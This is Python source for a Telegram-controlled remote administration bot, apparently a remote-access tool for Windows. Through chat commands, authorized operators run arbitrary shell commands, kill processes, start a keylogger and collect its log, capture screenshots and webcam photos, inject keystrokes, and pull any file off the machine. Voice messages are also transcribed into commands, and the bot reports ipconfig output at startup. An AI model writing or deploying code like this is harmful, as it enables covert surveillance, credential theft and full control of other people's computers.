from distutils import text_file
from re import T
from telepot.loop import MessageLoop
from dotenv import load_dotenv

import telepot
import secrets
import pyscreenshot
import json
from subprocess import run, Popen,PIPE
from urllib import request as open_web
import time
import datetime
import os
import cv2
from logger import *
import requests
from pynput.keyboard import Controller as key
import speech_recognition as sr
import pyttsx3
load_dotenv()
admin_chat_id = os.getenv("ADMIN_CHAT_ID")  # chat_id of admin in int form
admin_name = os.getenv("ADMIN_NAME")
api_key = os.getenv("API_KEY")
print(admin_chat_id, api_key, admin_name)
chat_id_file = 0
fin = ''
random_f = ''
fname = ''
fileMessageId = ''


def replymessage(first_name, last_name, command, chat_id):
    global auth_list, random, authorized, aut_chat_id, pending, logging, logger, key_list, chat_id_file, fin, fname, fileMessageId
    name = f'{first_name} {last_name}'
    print(name)
    print('Received:', command, 'chat_id', chat_id)
    authorized = False
    print(random)
    if pending == 0 or chat_id != aut_chat_id:
        for i in auth_list['authorized']:
            if i['chat_id'] == chat_id:
                authorized = True
                break
        if authorized:
            list_command = command.split()
            if list_command[0] == "Send" or list_command[0] == "send":
                if chat_id == admin_chat_id:
                    x = len(list_command[0])
                    telegram_bot.sendDocument(
                        chat_id, open(command[x+1:], 'rb'))
            elif list_command[0] == "types" or list_command[0] == "Types":
                keyboard = key()
                x = len(list_command[0])
                keyboard.type(command[x+1:])
            elif list_command[0] == "Speak" or list_command[0] == "speak":
                speak = pyttsx3.init()
                x = len(list_command[0])
                speak.say(command[x:])
                speak.runAndWait()
            elif chat_id == chat_id_file and list_command[0] == random_f:
                with open(f'downloads/{fname}', "wb") as f:
                    f.write(fin.content)
                chat_id_file = 0
                fin = ""
                telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
                fname = ""
                fileMessageId = "aa"

            elif ((list_command[0] == "screenshot") | (list_command[0] == "Screenshot")):
                print("scr")
                img = pyscreenshot.grab()
                img.save('screen.png')
                telegram_bot.sendPhoto(chat_id, photo=open("screen.png", 'rb'))
                os.remove("screen.png")
            elif((list_command[0] == "stop") | (list_command[0] == "Stop")):
                command = f'''Taskkill /f /Im "{list_command[1]}.exe" /t'''
                if len(list_command) == 2:
                    message = Popen(command, shell=True,
                                    stdout=PIPE, text=True).communicate()[0]
                else:
                    message = 'Invalid command'
                telegram_bot.sendMessage(chat_id, message)
            elif((list_command[0] == "photo") | (list_command[0] == "Photo")):
                vod = cv2.VideoCapture(0)
                d, img = vod.read()
                vod.release()
                cv2.imwrite('photo.png', img)
                telegram_bot.sendPhoto(chat_id, photo=open('photo.png', 'rb'))
                os.remove('photo.png')
            elif((list_command[0] == "keylog") | (list_command[0] == "Keylog")):
                if not logging:
                    logger = Listener(on_press=key_handeler)
                    logger.start()
                    telegram_bot.sendMessage(chat_id, "Key logger stared")
                    logging = True
                else:
                    logger.stop()
                    telegram_bot.sendMessage(chat_id, "Key logger stopped")
                    telegram_bot.sendDocument(
                        chat_id, document=open("KeyLoger.txt", "rb"))
                    x = open("KeyLoger.txt", "w")
                    x.close()
                    logging = False
            else:
                message = Popen(command, shell=True, stdout=PIPE,
                                text=True).communicate()[0]
                telegram_bot.sendMessage(
                    chat_id, "INVALID Command"if message == "" else message)

        else:
            random = str(secrets.token_hex(6)).upper()
            print(random, type(random))

            telegram_bot.sendMessage(admin_chat_id, random)
            telegram_bot.sendMessage(admin_chat_id, str(
                'do you want to authorize ' + name))

            telegram_bot.sendMessage(
                chat_id, f'you are not a authorized user please contact {admin_name}')
            telegram_bot.sendMessage(
                chat_id, 'He will tell you the authorization code')
            aut_chat_id = chat_id
            pending = 1
            print(pending, aut_chat_id)
    else:
        print(random)
        if command == random:
            telegram_bot.sendMessage(
                chat_id, str('you are authorized ' + name))
            new_guy = {'chat_id': chat_id, 'Name': name}
            print(new_guy)
            auth_list['authorized'].append(new_guy)
            print(auth_list)
            pending = 0
            with open('authorzed_Users/authorzed_Users.json', 'w') as f:
                json.dump(auth_list, f, indent=2)
                f.close()
        else:
            telegram_bot.sendMessage(chat_id, 'sorry invalid code')


def download_file(msg, key):
    global fin, fname, pending, random_f, chat_id_file, fileMessageId, admin_chat_id
    chat_id = msg['chat']['id']
    fileMessageId = msg['message_id']
    print(fileMessageId)
    chat_id_file = chat_id
    authorized = False
    if pending == 0 or chat_id != aut_chat_id:
        for i in auth_list['authorized']:
            if i['chat_id'] == chat_id:
                authorized = True
                break
    if authorized:
        if key == key_list[4]:
            fname = msg[key]["file_name"]
        if key == "photo":
            fid = msg[key][3]["file_id"]
        else:
            fid = msg[key]["file_id"]
        resp = requests.get(
            url=f"https://api.telegram.org/bot{api_key}/getFile?file_id={fid}")
        resp = resp.json()
        fp = resp["result"]["file_path"]
        if key != key_list[4]:
            fname = fp[fp.index('/')+1:]
        fin = requests.get(
            url=f"https://api.telegram.org/file/bot{api_key}/{fp}", allow_redirects=True)
        if not(str(chat_id).startswith(admin_chat_id) and str(chat_id).endswith(admin_chat_id)):
            if fname.endswith(".oga"):
                with open(f'downloads/{fname}', "wb") as f:
                    f.write(fin.content)
                convertCommand=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
                print(convertCommand)
                message = Popen(convertCommand, shell=True,
                                    stdout=PIPE, text=True).communicate()[0]
                text=""
                print(message)
                speach=sr.Recognizer() 
                with sr.AudioFile(f"downloads/{fname}.wav") as source:
                    # listen for the data (load audio to memory)
                    audio_data = speach.record(source)
                    # recognize (convert from speech to text)
                    text = speach.recognize_google(audio_data)
                    print(text)
                chat_id = msg['chat']['id']
                #command = msg['text']
                os.remove(f"downloads/{fname}.wav")
                os.remove(f"downloads/{fname}")
                first_name = msg['chat']['first_name']
                last_name = msg['chat']['last_name']
                chat_id_file = 0
                fin = ""
                fname = ""
                fileMessageId = "aa"
                replymessage(first_name, last_name, text, chat_id)
            else:
                print(admin_chat_id)
                random_f = str(secrets.token_hex(32)).upper()
                telegram_bot.sendMessage(
                    chat_id, f'{admin_name} will tell you the authorization code')
                telegram_bot.sendMessage(
                    admin_chat_id, f"do you want to recive {key} send a key to { msg['chat']['first_name']} {msg['chat']['last_name']} of ")
                telegram_bot.sendMessage(admin_chat_id, random_f)
        else:
            with open(f'downloads/{fname}', "wb") as f:
                f.write(fin.content)
            if fname.endswith(".oga"):
                convertCommand=f'C:/tweakes/bin/ffmpeg -y -i downloads/{fname} downloads/{fname}.wav'
                print(convertCommand)
                message = Popen(convertCommand, shell=True,
                                    stdout=PIPE, text=True).communicate()[0]
                text=""
                print(message)
                speach=sr.Recognizer() 
                with sr.AudioFile(f"downloads/{fname}.wav") as source:
                    # listen for the data (load audio to memory)
                    audio_data = speach.record(source)
                    # recognize (convert from speech to text)
                    text = speach.recognize_google(audio_data)
                    print(text)
                chat_id = msg['chat']['id']
                #command = msg['text']
                os.remove(f"downloads/{fname}.wav")
                os.remove(f"downloads/{fname}")
                first_name = msg['chat']['first_name']
                last_name = msg['chat']['last_name']
                replymessage(first_name, last_name, text, chat_id)
                
            chat_id_file = 0
            fin = ""
            telegram_bot.sendMessage(chat_id, f'file saved as {fname}')
            fname = ""
            
            fileMessageId = "aa"


key_list = ["text", "voice", "photo", "video", "document"]
file_found = False
while not file_found:
    try:
        with open('authorzed_Users/authorzed_Users.json') as f:
            auth_list = json.load(f)
        print(auth_list)
        file_found = True
    except:
        data = {'authorized': [{'chat_id': None, 'Name': None}]}
        with open('authorzed_Users/authorzed_Users.json', 'w') as f:
            json.dump(data, f, indent=2)

connected = False
while (connected == False):
    try:
        x = open_web.urlopen('https://api.ipify.org/')
        connected = True
    except:
        connected = False
        time.sleep(1)
print(auth_list)

random = 1
now = datetime.datetime.now()
authorized = 0
aut_chat_id = 0
pending = 0
logging = False
logger = 0


def test_message():
    i = 2
    while (i > 0):
        messag = Popen('ipconfig', shell=True, stdout=PIPE,
                       text=True).communicate()[0]
     #  print(messag)
        telegram_bot.sendMessage(admin_chat_id, messag)
       # time.sleep(5)
        i = i - 1


def action(msg):
    global auth_list, random, authorized, aut_chat_id, pending, logging, logger, key_list
    print(auth_list)

    chat_id = msg['chat']['id']
    #command = msg['text']
    first_name = msg['chat']['first_name']
    last_name = msg['chat']['last_name']
    for i in key_list:
        try:
            command = msg[i]
            key = i
        except KeyError:
            continue
    if key == "text":
        replymessage(first_name, last_name, command, chat_id)
    if key in key_list[1:]:
        download_file(msg, key)


telegram_bot = telepot.Bot(api_key)
test_message()

print(telegram_bot.getMe())  # for internal testing
MessageLoop(telegram_bot, action).run_as_thread()

while 1:
    time.sleep(1)
